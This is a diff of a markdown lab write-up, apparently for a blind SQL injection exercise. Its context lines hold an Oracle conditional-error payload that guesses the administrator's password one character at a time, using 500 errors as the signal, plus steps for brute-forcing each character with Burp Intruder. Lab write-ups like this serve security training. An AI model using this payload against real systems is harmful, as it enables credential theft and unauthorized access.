@@ -39,10 +39,13 @@
 > ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substring(password,1,1)='a') ||'
 
 -> 500 interval server error: a is the first character
-![alt text](image.png)
+
 
 > Intruder -> Type:Brute Forcer -> Min_Max:1_1-> Set filter (pro version)
 
 > Cluster bomb2 -> Type:Brute Forcer -> 2 payload
+
 *`LAB SOLVED`*
+
+![alt text](image.png)
 ![alt text](image-1.png)
